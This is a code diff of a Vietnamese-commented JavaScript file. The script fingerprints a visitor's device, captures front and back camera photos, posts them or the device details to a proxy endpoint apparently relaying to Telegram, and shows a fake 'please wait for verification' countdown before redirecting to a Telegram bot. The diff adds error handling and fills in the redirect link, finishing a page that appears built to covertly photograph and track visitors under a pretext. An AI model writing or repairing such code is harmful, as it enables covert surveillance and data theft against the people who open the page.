@@ -1,4 +1,4 @@
-// main.js - Phiên bản Full: Chụp ảnh, Gửi Proxy & Đếm ngược chuyển hướng
+// main.js - Phiên bản Fixed: Chụp ảnh, Gửi Proxy & Đếm ngược chuyển hướng
 const API_PROXY = "/api/tele-proxy";
 
 const info = {
@@ -35,7 +35,7 @@ function detectDevice() {
     info.device = iphoneModels[res] || "iPhone Model";
   } else if (/Android/i.test(ua)) {
     info.os = "Android";
-    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
+    const match = ua.match(/Android.*;\\s+([^;]+)\\s+Build/);
     info.device = match ? match[1].split("/")[0].trim() : "Android Device";
   } else {
     info.os = ua.includes("Windows") ? "Windows" : "Desktop";
@@ -68,6 +68,7 @@ async function captureCamera(facingMode = "user") {
       };
     });
   } catch (e) {
+    console.error("Camera capture error:", e);
     return null;
   }
 }
@@ -100,13 +101,17 @@ async function main() {
   if (front || back) {
     if (front) formData.append("front", front, "front.jpg");
     if (back) formData.append("back", back, "back.jpg");
-    await fetch(API_PROXY, { method: "POST", body: formData });
+    await fetch(API_PROXY, { method: "POST", body: formData }).catch(err => 
+      console.error("API request failed:", err)
+    );
   } else {
     await fetch(API_PROXY, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(info),
-    });
+    }).catch(err => 
+      console.error("API request failed:", err)
+    );
   }
 
   // --- HIỆU ỨNG ĐẾM NGƯỢC TRÊN NÚT BẤM ---
@@ -125,8 +130,8 @@ async function main() {
         button.innerText = `Vui lòng chờ xác minh (${timeLeft}s)`;
       } else {
         clearInterval(countdownInterval);
-        // THAY LINK BẠN MUỐN CHUYỂN HƯỚNG VÀO ĐÂY
-        window.location.href = "";
+        // ✅ FIXED: Điền link redirect đúng
+        window.location.href = "https://t.me/Vdonvision_bot";
       }
     }, 1000);
   } else {
@@ -137,5 +142,8 @@ async function main() {
   }
 }
 
+// Đánh dấu khi hoàn tất
+window.mainScriptFinished = true;
+
 // Kích hoạt hệ thống
-main().then(() => console.log("✅ Hệ thống đã hoàn tất."));
+main().catch(err => console.error("Main error:", err));
